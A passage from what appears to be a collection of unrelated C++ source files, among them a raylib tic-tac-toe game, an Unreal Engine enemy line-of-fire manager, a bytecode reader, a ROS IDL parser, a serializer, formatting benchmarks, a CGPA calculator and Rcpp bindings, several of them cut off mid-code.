: TextFormat(\"%c Wins!\", game.winner);\n    DrawText(message, window_w / 2 - MeasureText(message, 40) / 2, 200, 40, BLACK);\n    DrawText(\"Press ENTER to Restart\", window_w / 2 - MeasureText(\"Press ENTER to Restart\", 20) / 2, 300, 20, GRAY);\n}\n\n// UI alert to show whose turn it is in the game\nvoid draw_status(const TicTacToeGame &game) {\n    constexpr int status_height = 50;\n\n    // Draw a rectangle for the status bar\n    DrawRectangle(0, window_h - status_height, window_w, status_height, LIGHTGRAY);\n\n    // Display the current player's turn\n    const char *status_message = game.playerTurn ? \"Player X's Turn\" : \"Player O's Turn\";\n    DrawText(\n        status_message,\n        window_w / 2 - MeasureText(status_message, 20) / 2,\n        window_h - status_height + 15,\n        20,\n        BLACK\n    );\n}\n\n\nint main() {\n    InitWindow(window_w, window_h, window_title);\n    SetTargetFPS(FPS);\n\n    TicTacToeGame game{};\n    init_game(game);\n\n ",
    "// Copyright DevRespawn.com (MBCG). All Rights Reserved.\n\n#include \"MBCG/EnemyAttackPrediction/MBCG_EnemyAttackPredictManager.h\"\n#include \"Logging/StructuredLog.h\"  // for UE_LOGFMT\n#include \"Weapons/LyraRangedWeaponInstance.h\"\n#include \"Physics/LyraCollisionChannels.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"DrawDebugHelpers.h\"\n\n\nDEFINE_LOG_CATEGORY_STATIC(LogAMBCG_EnemyAttackPredictManager, All, All);\n// Example of use:\n// UE_LOGFMT(LogAMBCG_EnemyAttackPredictManager, Display, \"Enemy removed: {0}\", InEnemy->GetName());\n\n\nAMBCG_EnemyAttackPredictManager::AMBCG_EnemyAttackPredictManager()\n{\n    PrimaryActorTick.bCanEverTick = true;\n}\n\n\nvoid AMBCG_EnemyAttackPredictManager::BeginPlay()\n{\n    Super::BeginPlay();\n\n    // by default\n    LastRegisteredAttackThreatTimeSeconds = GetWorld()->GetTimeSeconds();\n}\n\n\nvoid AMBCG_EnemyAttackPredictManager::Tick(float DeltaTime)\n{\n    Super::Tick(DeltaTime);\n}\n\n\nTArray<APawn*> AMBCG_EnemyAttackPredictManager::GetEnemies() const\n{\n    return Enemies;\n}\n\n\nvoid AMBCG_EnemyAttackPredictManager::AddUniqueEnemy(APawn* InEnemy)\n{\n    if (!InEnemy) return;\n\n    if (InEnemy && !Enemies.Contains(InEnemy))\n    {\n        Enemies.AddUnique(InEnemy);\n    }\n}\n\n\nvoid AMBCG_EnemyAttackPredictManager::RemoveEnemy(APawn* InEnemy)\n{\n    if (!InEnemy) return;\n\n    if (InEnemy && Enemies.Contains(InEnemy))\n    {\n        Enemies.Remove(InEnemy);\n    }\n}\n\n\nvoid AMBCG_EnemyAttackPredictManager::RemoveAllEnemies()\n{\n    Enemies.Empty();\n}\n\n\nint32 AMBCG_EnemyAttackPredictManager::GetNumberOfEnemies() const\n{\n    return Enemies.Num();\n}\n\n\nAPawn* AMBCG_EnemyAttackPredictManager::GetHero() const\n{\n    return Hero;\n}\n\n\nvoid AMBCG_EnemyAttackPredictManager::SetHero(APawn* InNewHero)\n{\n    Hero = InNewHero;\n}\n\n\nvoid AMBCG_EnemyAttackPredictManager::AddTraceIgnoreActor(/*out*/ FCollisionQueryParams& TraceParams, const AActor* ActorToIgnore) const\n{\n    if (!ActorToIgnore)\n    {\n        UE_LOGFMT(LogAMBCG_EnemyAttackPredictManager, Warning, \"Function AddTraceIgnoreActor(): ActorToIgnore argument is unexpectedly nullptr. The function will exit now.\");\n        return;\n    }\n\n    // Ignore ActorToIgnore and any actors attached to it\n    TraceParams.AddIgnoredActor(ActorToIgnore);\n    TArray<AActor*> AttachedActors;\n    ActorToIgnore->GetAttachedActors(/*out*/ AttachedActors);\n    TraceParams.AddIgnoredActors(AttachedActors);\n}\n\n\nvoid AMBCG_EnemyAttackPredictManager::AddTraceIgnore(/*out*/ FCollisionQueryParams& TraceParams, const TArray<AActor*>& ActorsToIgnore) const\n{\n    for (const AActor* Actor : ActorsToIgnore)\n    {\n        if (Actor)\n        {\n            AddTraceIgnoreActor(TraceParams, Actor);\n        }\n    }\n}\n\n\nbool AMBCG_EnemyAttackPredictManager::IsLineOfFireOpen(  //\n    const FVector& StartTrace,                           //\n    const FVector& EndTrace,                             //\n    const AActor* SourceActorToIgnore,                   // to avoid false alert\n    const AActor* TargetActorToIgnore,                   // to avoid false alert\n    const TArray<AActor*>& OtherActorsToIgnore) const\n{\n    // FYI: it's modified UMBCG_LyraGA_RangedWeapon::WeaponTrace\n    /*\n    if (!SourceActorToIgnore)\n    {\n        UE_LOGFMT(LogAMBCG_EnemyAttackPredictManager, Warning, \"Function IsLineOfFireOpen(): SourceActorToIgnore argument is unexpectedly nullptr.\");\n    }\n    if (!TargetActorToIgnore)\n    {\n        UE_LOGFMT(LogAMBCG_EnemyAttackPredictManager, Warning, \"Function IsLineOfFireOpen(): TargetActorToIgnore argument is unexpectedly nullptr.\");\n    }\n    */\n\n    // Ignore source and target actors when line tracing\n    TArray<AActor*> ActorsToIgnore = OtherActorsToIgnore;\n    if (SourceActorToIgnore)\n    {\n        ActorsToIgnore.Add(const_cast<AActor*>(SourceActorToIgnore));\n    }\n    if (TargetActorToIgnore)\n    {\n        ActorsToIgnore.Add(const_cast<AActor*>(TargetActorToIgnore));\n    }\n\n    FHitResult HitResult;\n\n    FCollisionQueryParams TraceParams(SCENE_QUERY_STAT(IsLineOfFireOpen), /*bTraceComplex=*/false);\n    TraceParams.bReturnPhysicalMaterial = false;\n    AddTraceIgnore(TraceParams, ActorsToIgnore);\n\n    const ECollisionChannel TraceChannel = Lyra_TraceChannel_Weapon;\n\n    if (GetWorld()->LineTraceSingleByChannel(HitResult, StartTrace, EndTrace, TraceChannel, TraceParams))\n    {\n        // line of the fire is obstructed\n        return false;\n    }\n    else\n    {\n        // DrawDebugLine(GetWorld(), StartTrace, EndTrace, FColor::Red, false, 1.0f, 0, 1.0f);\n        return true;\n    }\n}\n\n\nbool AMBCG_EnemyAttackPredictManager::IsLineOfFireOpenNoOtherIgnoredActors(  //\n    const FVector& StartTrace,                                               //\n    const FVector& EndTrace,                                                 //\n    const AActor* SourceActorToIgnore,                                       // to avoid false alert\n    const AActor* TargetActorToIgnore                                        // to avoid false alert\n) const\n{\n    TArray<AActor*> EmptyArray;\n    r",
    "\ufeff//  -*-  coding: utf-8-with-signature;  mode: c++  -*-  //\n/*************************************************************************\n**                                                                      **\n**                      ---  Library Project.  ---                      **\n**                                                                      **\n**          Copyright (C), 2016-2024, Takahiro Itou                     **\n**          All Rights Reserved.                                        **\n**                                                                      **\n**          License: (See COPYING or LICENSE files)                     **\n**          GNU Affero General Public License (AGPL) version 3,         **\n**          or (at your option) any later version.                      **\n**                                                                      **\n*************************************************************************/\n\n/**\n**      An Implementation of SampleDocument class.\n**\n**      @file       Common/SampleDocument.cpp\n**/\n\n#include    \"Sample/Common/SampleDocument.h\"\n\n\nSAMPLE_NAMESPACE_BEGIN\nnamespace  Common  {\n\nnamespace  {\n\n}   //  End of (Unnamed) namespace.\n\n\n//========================================================================\n//\n//    SampleDocument  class.\n//\n\n//========================================================================\n//\n//    Constructor(s) and Destructor.\n//\n\n//----------------------------------------------------------------\n//    \u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u3092\u521d\u671f\u5316\u3059\u308b\n//  \uff08\u30c7\u30d5\u30a9\u30eb\u30c8\u30b3\u30f3\u30b9\u30c8\u30e9\u30af\u30bf\uff09\u3002\n\nSampleDocument::SampleDocument()\n    : m_message()\n{\n}\n\n//----------------------------------------------------------------\n//    \u30a4\u30f3\u30b9\u30bf\u30f3\u30b9\u3092\u7834\u68c4\u3059\u308b\n//  \uff08\u30c7\u30b9\u30c8\u30e9\u30af\u30bf\uff09\u3002\n//\n\nSampleDocument::~SampleDocument()\n{\n}\n\n//========================================================================\n//\n//    Public Member Functions (Implement Pure Virtual).\n//\n\n//========================================================================\n//\n//    Public Member Functions (Overrides).\n//\n\n//========================================================================\n//\n//    Public Member Functions (Pure Virtual Functions).\n//\n\n//========================================================================\n//\n//    Public Member Functions (Virtual Functions).\n//\n\n//----------------------------------------------------------------\n//    \u5165\u529b\u30e1\u30c3\u30bb\u30fc\u30b8\u4e2d\u306b\u542b\u307e\u308c\u308b\u30a2\u30eb\u30d5\u30a1\u30d9\u30c3\u30c8\u3092\u6570\u3048\u308b\u3002\n//\n\nint\nSampleDocument::countAlphabet()  const\n{\n    const   size_t  len = this->m_message.length();\n    size_t  cnt = 0;\n    for ( size_t i = 0; i < len; ++ i ) {\n        const  char tmp = this->m_message[i];\n        if ( ('A' <= tmp) && (tmp <= 'Z') ) {\n            ++ cnt;\n        } else if ( ('a' <= tmp) && (tmp <= 'z') ) {\n            ++ cnt;\n        }\n    }\n\n    return ( static_cast<int>(cnt) );\n}\n\n//========================================================================\n//\n//    Public Member Functions.\n//\n\n//========================================================================\n//\n//    Accessors.\n//\n\n//----------------------------------------------------------------\n//    \u30e1\u30c3\u30bb\u30fc\u30b8\u3092\u8a2d\u5b9a\u3059\u308b\u3002\n\nvoid\nSampleDocument::setMessage(\n        const  std::string  &message)\n{\n    this->m_message = message;\n}\n\n//========================================================================\n//\n//    Protected Member Functions.\n//\n\n//========================================================================\n//\n//    For Internal Use Only.\n//\n\n}   //  End of namespace  Common\nSAMPLE_NAMESPACE_END\n",
    "#include <string>\n#include <vector>\n#include <iostream>\nusing namespace std;\n\n// task1: find the starting index where the letter is, in the string\n// task2: find the ending index where the letter is, in the string\n// task3: put each word inside a vector or list\n\nstring reverseEveryWord(string &str)\n{\n    vector<string> words;\n    int i = 0;\n    int size = str.size();\n    int start, end;\n    while (i < size)\n    {\n        while (i < size && str[i] == ' ') // finding the first character\n            i++;\n        if (i >= size)\n            break;\n\n        start = i;\n\n        while (i < size && str[i] != ' ') // finding the last character\n            i++;\n\n        end = i - 1;\n\n        string foundWord = str.substr(start, end - start + 1);\n        words.push_back(foundWord);\n    }\n\n    string resultantString = \"\";\n\n    // Adding all the words, in the reverse order, in the resultant string\n    for (int i = words.size() - 1; i >= 0; i--)\n    {\n        resultantString += words[i];\n\n        // Adding spaces in between\n        if (i != 0)\n            resultantString.push_back(' ');\n    }\n\n    return resultantString;\n}\n\nint main()\n{\n    string inputString = \"Ram is a good boy\";\n\n    string reversedString = reverseEveryWord(inputString);\n\n    for(const char ch: reversedString)\n        cout<<ch;\n\n    return 0;\n}",
    "/**\n*\n* Date: 1-1-2025\n* Author: Jeremiah J.\n* File: Reader.cpp\n* Description: This is the source file for the Reader class.\n*\n*/\n#include \"Reader.hpp\"\n\nReader::Reader(const std::vector<uint8_t>& bytecode, size_t index): bytecode(bytecode), index(index) {}\n\nuint8_t Reader::ReadByte() {\n\tif (index >= bytecode.size()) throw std::out_of_range(\"Read past end of bytecode\");\n\treturn bytecode[index++];\n}\n\nstd::vector<uint8_t> Reader::ReadBytes(size_t count) {\n\tif (index + count > bytecode.size()) throw std::out_of_range(\"Read past end of bytecode\");\n\tstd::vector<uint8_t> bytes(bytecode.begin() + index, bytecode.begin() + index + count);\n\tindex += count;\n\treturn bytes;\n}\n\nint32_t Reader::ReadInt32() {\n\tauto bytes = ReadBytes(4);\n\treturn bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24);\n}\n\ndouble Reader::ReadDouble() {\n\tauto bytes = ReadBytes(8);\n\tdouble value;\n\tstd::memcpy(&value, bytes.data(), sizeof(double));\n\treturn value;\n}\n\nstd::string Reader::ReadString() {\n\tint32_t length = ReadInt32();\n\tif (length <= 0) return \"\";\n\tauto bytes = ReadBytes(length);\n\tif (bytes.back() == 0) bytes.pop_back();\n\treturn std::string(bytes.begin(), bytes.end());\n}\n\nvoid Reader::SkipBytes(size_t count) {\n\tif (index + count > bytecode.size()) throw std::out_of_range(\"Skipped past end of bytecode\");\n\tindex += count;\n}\n\nsize_t Reader::GetIndex() const {\n\treturn index;\n}\n\nstd::string Reader::ByteToHex(uint8_t byte) {\n\tstd::stringstream stream;\n\tstream << std::hex << std::uppercase << std::setw(2) << std::setfill('0') << static_cast<int>(byte);\n\treturn stream.str();\n}\n\nstd::string Reader::BytesToHex(const std::vector<uint8_t>& bytes) {\n\tstd::stringstream stream;\n\tfor (const auto& byte : bytes) {\n\t\tstream << ByteToHex(byte) << \" \";\n\t}\n\treturn stream.str();\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"untitled9\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <nlohmann/json_fwd.hpp>\n#include <rosidlcpp_parser/rosidlcpp_parser.hpp>\n\n#include <cassert>\n#include <cctype>\n#include <charconv>\n#include <cstddef>\n#include <format>\n#include <fstream>\n#include <iterator>\n#include <sstream>\n#include <stdexcept>\n#include <string>\n#include <string_view>\n\n#include <iostream>\n#include <system_error>\n\n#include <nlohmann/json.hpp>\n\nconstexpr std::string_view STRING_MODULE = \"module\";\nconstexpr std::string_view STRING_STRUCT = \"struct\";\nconstexpr std::string_view STRING_TYPEDEF = \"typedef\";\nconstexpr std::string_view STRING_CONST = \"const\";\nconstexpr std::string_view STRING_INCLUDE = \"#include\";\n\nconstexpr std::string_view VALID_NUMERIC = \"1234567890-\";\nconstexpr std::string_view VALID_TYPE_CHAR = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_:\";\nconstexpr std::string_view VALID_NAME_CHAR = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_\";\nconstexpr std::string_view WHITE_CHAR = \" \\t\\n\";\n\nusing json = nlohmann::json;\n\nusing TypedefMap = std::unordered_map<std::string, std::string>;\n\nnamespace rosidlcpp_parser {\n\nstd::vector<std::string> split_string(std::string_view value, std::string_view sep) {\n  std::vector<std::string> result;\n\n  auto cursor = value.find(sep);\n  while (cursor != std::string::npos) {\n    result.push_back(std::string{value.substr(0, cursor)});\n    value.remove_prefix(cursor + sep.size());\n    cursor = value.find(sep);\n  }\n  result.push_back(std::string{value});\n\n  return result;\n}\n\nauto consume_white_space(std::string_view& content_view) -> void {\n  auto new_start = content_view.find_first_not_of(\" \\t\\n\");\n  if (new_start != std::string_view::npos) {\n    content_view.remove_prefix(new_start);\n  } else {\n    content_view.remove_prefix(content_view.size());\n  }\n}\n\nauto consume_comment(std::string_view& content_view) -> void {\n  if (content_view.substr(0, 2) == \"//\") {\n    auto end_of_line = content_view.find_first_of('\\n');\n    if (end_of_line == std::string_view::npos) {\n      content_view.remove_prefix(content_view.size());\n    } else {\n      content_view.remove_prefix(end_of_line + 1);\n    }\n  }\n}\n\nauto consume_white_space_and_comment(std::string_view& content_view) -> void {\n  size_t old_size;\n  do {\n    old_size = content_view.size();\n    consume_white_space(content_view);\n    consume_comment(content_view);\n  } while (old_size != content_view.size());\n}\n\nauto remove_white_space(std::string_view content_view) -> std::string_view {\n  auto start = content_view.find_first_not_of(WHITE_CHAR);\n  auto end = content_view.find_last_not_of(WHITE_CHAR);\n\n  if (start == std::string_view::npos) {\n    return \"\";\n  }\n\n  return content_view.substr(start, end - start + 1);\n}\n\nauto parse_name(std::string_view& content_view) -> std::string_view {\n  auto end_of_name = content_view.find_first_not_of(VALID_NAME_CHAR);\n  auto name = content_view.substr(0, end_of_name);\n\n  content_view.remove_prefix(end_of_name);\n\n  return name;\n}\n\nauto interpret_type(std::string_view type_string, TypedefMap typedefs) -> json {\n  json result;\n  if (type_string.starts_with(\"string<\")) {  // string<bounds>\n    result[\"name\"] = \"string\";\n    type_string.remove_prefix(std::string_view{\"string<\"}.size());\n    type_string.remove_suffix(1);  // Remove last '>'\n    result[\"maximum_size\"] = std::stoi(std::string{remove_white_space(type_string)});\n  } else if (type_string.starts_with(\"sequence<\")) {  // sequence<type> or sequence<type, bounds>\n    result[\"name\"] = \"sequence\";\n\n    type_string.remove_prefix(std::string_view(\"sequence<\").size());\n    type_string.remove_suffix(1);  // Remove last '>'\n\n    auto comma_pos = type_string.find_first_of(',');  // Deal with bounded sequences\n    if (comma_pos != std::string_view::npos) {\n      result[\"maximum_size\"] = std::stoi(std::string{remove_white_space(type_string.substr(comma_pos + 1))});\n    } else {\n    }\n    type_string = remove_white_space(type_string.substr(0, comma_pos));\n    result[\"value_type\"] = interpret_type(type_string, typedefs);\n  } else if (type_string.ends_with(\"]\")) {  // array\n    // Parse array type\n    auto open_bracket_pos = type_string.find_first_of('[');\n    result[\"size\"] = std::stoi(std::string{type_string.substr(open_bracket_pos + 1, type_string.size() - 2)});\n    result[\"name\"] = \"array\";\n    type_string = type_string.substr(0, open_bracket_pos);\n    result[\"value_type\"] = interpret_type(type_string, typedefs);\n  } else if (typedefs.contains(std::string{type_string})) {\n    result = interpret_type(typedefs[std::string{type_string}], typedefs);\n  } else {  // Check for namespaced type\n    auto namespaced_type = split_string(type_string, \"::\");\n    if (namespaced_type.size() > 1) {\n      result[\"name\"] = namespaced_type.back();\n      namespaced_type.pop_back();\n      result[\"namespaces\"] = namespaced_type;\n    } else {\n      result[\"name\"] = type_string;\n    }\n  }\n\n  return result;\n}\n\nauto parse_type(std::string_view& content_view) -> std::string_view {\n  auto end_of_type = content_view.find_",
    "#include \"serializer.hpp\"\r\n#include <iostream>\r\n#include <algorithm>\r\n\r\n\r\n\r\nnamespace S = SERIALIZER;\r\n\r\n\r\n\r\nvoid print_xml() {\r\n   std::cout << \"\\t\\033[32mXML:\\033[0m\\n\";\r\n}\r\n\r\n\r\n\r\nvoid print_json() {\r\n   std::cout << \"\\033[36m\\tJSON:\\033[0m\\n\";\r\n}\r\n\r\n\r\n\r\nvoid S::ChainOfBlocks::add_field(const std::string& name, const std::string& value) {\r\n   if ( this->blocks.empty() )\r\n      throw std::runtime_error(\"No block to add field to [-1]:\");\r\n\r\n   this->blocks.back().fields.emplace_back(name, value);\r\n}\r\n\r\n\r\n\r\nvoid S::ChainOfBlocks::add_block(const std::string& name) {\r\n   this->blocks.emplace_back(name);\r\n}\r\n\r\n\r\n\r\nvoid S::XML_Serializer::build() {\r\n   if (! (this->blocks.empty()) )\r\n   {\r\n      print_xml();\r\n\r\n      for (const auto& block : blocks)\r\n         this->build_block(block, 0);\r\n   }\r\n}\r\n\r\n\r\n\r\nvoid S::XML_Serializer::build_block(const Block& block, int indent) {\r\n   std::string indent_str(indent, ' ');\r\n   std::cout << indent_str << \"<\" << block.name_block << \">\\n\";\r\n\r\n   for (const auto& field : block.fields)\r\n      std::cout << indent_str << \"  <\" << field.first << \">\" << field.second << \"</\" << field.first << \">\\n\";\r\n\r\n   std::cout << indent_str << \"</\" << block.name_block << \">\\n\";\r\n}\r\n\r\n\r\n\r\nvoid S::JSON_Serializer::build() {\r\n   if (! (this->blocks.empty()) )\r\n   {\r\n      print_json();\r\n      std::cout << \"{\\n\\n\";\r\n\r\n      for (const auto& block : blocks)\r\n         this->build_block(block, 0);\r\n\r\n      std::cout << \"}\\n\";\r\n   }\r\n}\r\n\r\n\r\n\r\nbool is_number(const std::string& str) {\r\n   return std::all_of(str.begin(), str.end(), ::isdigit);\r\n}\r\n\r\n\r\n\r\nvoid S::JSON_Serializer::build_block(const Block& block, int indent) {\r\n   indent += 2;\r\n   std::string indent_str(indent, ' ');\r\n   std::cout << indent_str << \"\\\"\" << block.name_block << \"\\\": {\\n\";\r\n\r\n   for (const auto& field : block.fields)\r\n      std::cout << indent_str << \"  \\\"\" << field.first << \"\\\": \" << (is_number(field.second) ? field.second + \"\\n\" : \"\\\"\" + field.second + \"\\\",\\n\");\r\n\r\n   std::cout << indent_str << \"},\\n\\n\";\r\n}\r\n",
    "#include <benchmark/benchmark.h>\n#include <map>\n#include <string>\n#include <variant>\n#include <fmt/format.h>\n#include <fmt/ranges.h>\n#include <fmt/core.h>\n#include <random>\n#include <ranges>\n#include <unordered_map>\n\nstatic std::map<std::string, std::string> create_map() {\n    return {\n        {\"age\", fmt::format(\"{}\", rand() % 100)},\n        {\"money\", fmt::format(\"{}\", drand48())},\n        {\"name\", \"John Doe\"},\n        {\"active\", fmt::format(\"{}\", rand() % 2 == 0)}\n    };\n}\n\nstatic std::map<std::string, std::variant<double, int, std::string, bool>> create_map_variant() {\n    std::map<std::string, std::variant<double, int, std::string, bool>> data;\n    data[\"age\"] = rand() % 100;\n    data[\"money\"] = drand48();\n    data[\"name\"] = \"John Doe\";\n    data[\"active\"] = rand() % 2 == 0;\n    return data;\n}\n\nenum class DataType {\n    Age,\n    Money,\n    Name,\n    Active\n};\n\nstatic std::map<DataType, std::variant<double, int, std::string, bool>> create_map_enum() {\n    std::map<DataType, std::variant<double, int, std::string, bool>> data;\n    data[DataType::Age] = rand() % 100;\n    data[DataType::Money] = drand48();\n    data[DataType::Name] = \"John Doe\";\n    data[DataType::Active] = rand() % 2 == 0;\n    return data;\n}\n\nstatic std::unordered_map<DataType, std::variant<double, int, std::string, bool>> create_unordered_map_enum_variant() {\n    std::unordered_map<DataType, std::variant<double, int, std::string, bool>> data;\n    data[DataType::Age] = rand() % 100;\n    data[DataType::Money] = drand48();\n    data[DataType::Name] = \"John Doe\";\n    data[DataType::Active] = rand() % 2 == 0;\n    return data;\n}\n\nstatic const char* get_key_str(DataType key) {\n    switch (key) {\n        case DataType::Age: return \"age\";\n        case DataType::Money: return \"money\";\n        case DataType::Name: return \"name\";\n        case DataType::Active: return \"active\";\n        default: return \"unknown\";\n    }\n}\n\nstatic void BM_MapEnumVariant_Format(benchmark::State& state) {\n    for (auto _ : state) {\n        auto data = create_map_enum();\n        fmt::memory_buffer result;\n        for (const auto& [key, value] : data) {\n            const char* key_str = get_key_str(key);\n            if (std::holds_alternative<double>(value)) {\n                fmt::format_to(std::back_inserter(result), \"{}: {:.6}\", key_str, std::get<double>(value));\n            } else if (std::holds_alternative<int>(value)) {\n                fmt::format_to(std::back_inserter(result), \"{}: {}\", key_str, std::get<int>(value));\n            } else if (std::holds_alternative<std::string>(value)) {\n                fmt::format_to(std::back_inserter(result), \"{}: {}\", key_str, std::get<std::string>(value));\n            } else {\n                fmt::format_to(std::back_inserter(result), \"{}: {}\", key_str, std::get<bool>(value));\n            }\n        }\n        std::string result_str = fmt::to_string(result);\n        benchmark::DoNotOptimize(result_str);\n    }\n}\nBENCHMARK(BM_MapEnumVariant_Format);\n\n\nstatic void BM_MapStrStr_Merge(benchmark::State& state) {\n    for (auto _ : state) {\n        auto data = create_map();\n        fmt::memory_buffer result;\n        for (const auto& [key, value] : data) {\n            fmt::format_to(std::back_inserter(result), \"{}: {:.6}\", key, value);\n        }\n        std::string result_str = fmt::to_string(result);\n        benchmark::DoNotOptimize(result_str);\n    }\n}\nBENCHMARK(BM_MapStrStr_Merge);\n\nstatic void BM_MapStrVariant_Format(benchmark::State& state) {\n    for (auto _ : state) {\n        auto data = create_map_variant();\n        fmt::memory_buffer result;\n        for (const auto& [key, value] : data) {\n            if (std::holds_alternative<double>(value)) {\n                fmt::format_to(std::back_inserter(result), \"{}: {:.6}\", key, std::get<double>(value));\n            } else if (std::holds_alternative<int>(value)) {\n                fmt::format_to(std::back_inserter(result),\"{}: {}\", key, std::get<int>(value));\n            } else if (std::holds_alternative<std::string>(value)) {\n                fmt::format_to(std::back_inserter(result),\"{}: {}\", key, std::get<std::string>(value));\n            } else {\n                fmt::format_to(std::back_inserter(result),\"{}: {}\", key, std::get<bool>(value));\n            }\n        }\n        std::string result_str = fmt::to_string(result);\n        benchmark::DoNotOptimize(result_str);\n    }\n}\nBENCHMARK(BM_MapStrVariant_Format);\n\n\nstatic void BM_MapUnorderedEnumVariant_Format(benchmark::State& state) {\n    for (auto _ : state) {\n        fmt::memory_buffer result;\n        auto data = create_unordered_map_enum_variant();\n        for (const auto& [key, value] : data) {\n            const char* key_str = get_key_str(key);\n            if (std::holds_alternative<double>(value)) {\n                fmt::format_to(std::back_inserter(result), \"{}: {:.6}\", key_str, std::get<double>(value));\n            } else if (std::holds_alternative<int>(value)) {\n                fmt::format_to(std::back_inserter(result), \"{}: {}\", key_str, s",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nint main() {\n    int number_of_subjects;\n    int marks, credit;\n    string grade;\n    double cgpa = 0.0, total_credits = 0.0, weighted_grade_points = 0.0;\n    \n    cout << \"Enter number of subjects: \";\n    cin >> number_of_subjects;\n    \n    int choice;\n    cout << \"Enter your choice (1 if you have marks or 2 if you have grades): \";\n    cin >> choice;\n    \n    if (choice == 1) {\n        for (int i = 1; i <= number_of_subjects; i++) {\n            cout << \"Enter marks of subject \" << i << \": \";\n            cin >> marks;\n            cout << \"Enter credit of subject \" << i << \": \";\n            cin >> credit;\n            \n            int grade_points;\n            if (marks >= 85) {\n                grade_points = 10;\n            } else if (marks >= 78 && marks < 85) {\n                grade_points = 9;\n            } else if (marks >= 70 && marks < 78) {\n                grade_points = 8;\n            } else if (marks >= 62 && marks < 70) {\n                grade_points = 7;\n            } else if (marks >= 54 && marks < 62) {\n                grade_points = 6;\n            } else if (marks >= 45 && marks < 54) {\n                grade_points = 5;\n            } else if (marks >= 40 && marks < 45) {\n                grade_points = 4;\n            } else {\n                cout << \"Marks less than 40 are considered as fail. Skipping this subject.\" << endl;\n                continue;\n            }\n            \n            weighted_grade_points += grade_points * credit;\n            total_credits += credit;\n        }\n    } else if (choice == 2) {\n        for (int i = 1; i <= number_of_subjects; i++) {\n            cout << \"Enter grade of subject \" << i << \": \";\n            cin >> grade;\n            cout << \"Enter credit of subject \" << i << \": \";\n            cin >> credit;\n            \n            int grade_points;\n            if (grade == \"O\") {\n                grade_points = 10;\n            } else if (grade == \"A+\") {\n                grade_points = 9;\n            } else if (grade == \"A\") {\n                grade_points = 8;\n            } else if (grade == \"B+\") {\n                grade_points = 7;\n            } else if (grade == \"B\") {\n                grade_points = 6;\n            } else if (grade == \"C\") {\n                grade_points = 5;\n            } else if (grade == \"D\") {\n                grade_points = 4;\n            } else if(grade == \"E\") {\n                grade_points = 0;\n            } else if (grade == \"F\") {\n                cout << \"Grade 'F' indicates failure. Skipping this subject.\" << endl;\n                continue;\n            } else {\n                cout << \"Invalid grade entered. Skipping this subject.\" << endl;\n                continue;\n            }\n            \n            weighted_grade_points += grade_points * credit;\n            total_credits += credit;\n        }\n    } else {\n        cout << \"Invalid choice!\" << endl;\n        return 1;\n    }\n    \n    if (total_credits > 0) {\n        cgpa = weighted_grade_points / total_credits;\n        cout << \"Your CGPA is: \" << fixed << setprecision(2) << cgpa << endl;\n        cout << \"This result is not appropriate but very to actual cgpa.\" << endl;\n    } else {\n        cout << \"No valid credits entered. Unable to calculate CGPA.\" << endl;\n    }\n    \n    return 0;\n}",
    "// Generated by using Rcpp::compileAttributes() -> do not edit by hand\n// Generator token: 10BE3573-1514-4C36-9D1C-5A225CD40393\n\n#include <Rcpp.h>\n\nusing namespace Rcpp;\n\n#ifdef RCPP_USE_GLOBAL_ROSTREAM\nRcpp::Rostream<true>&  Rcpp::Rcout = Rcpp::Rcpp_cout_get();\nRcpp::Rostream<false>& Rcpp::Rcerr = Rcpp::Rcpp_cerr_get();\n#endif\n\n// scan_ini_file\nstd::vector<std::string> scan_ini_file(const std::string& filename);\nRcppExport SEXP _ConfigINI_scan_ini_file(SEXP filenameSEXP) {\nBEGIN_RCPP\n    Rcpp::RObject rcpp_result_gen;\n    Rcpp::RNGScope rcpp_rngScope_gen;\n    Rcpp::traits::input_parameter< const std::string& >::type filename(filenameSEXP);\n    rcpp_result_gen = Rcpp::wrap(scan_ini_file(filename));\n    return rcpp_result_gen;\nEND_RCPP\n}\n// process_profile_name\nstd::vector<std::string> process_profile_name(const std::vector<std::string>& vec);\nRcppExport SEXP _ConfigINI_process_profile_name(SEXP vecSEXP) {\nBEGIN_RCPP\n    Rcpp::RObject rcpp_result_gen;\n    Rcpp::RNGScope rcpp_rngScope_gen;\n    Rcpp::traits::input_parameter< const std::vector<std::string>& >::type vec(vecSEXP);\n    rcpp_result_gen = Rcpp::wrap(process_profile_name(vec));\n    return rcpp_result_gen;\nEND_RCPP\n}\n// write_ini\nvoid write_ini(Rcpp::List config_list, std::string filename);\nRcppExport SEXP _ConfigINI_write_ini(SEXP config_listSEXP, SEXP filenameSEXP) {\nBEGIN_RCPP\n    Rcpp::RNGScope rcpp_rngScope_gen;\n    Rcpp::traits::input_parameter< Rcpp::List >::type config_list(config_listSEXP);\n    Rcpp::traits::input_parameter< std::string >::type filename(filenameSEXP);\n    write_ini(config_list, filename);\n    return R_NilValue;\nEND_RCPP\n}\n\nstatic const R_CallMethodDef CallEntries[] = {\n    {\"_ConfigINI_scan_ini_file\", (DL_FUNC) 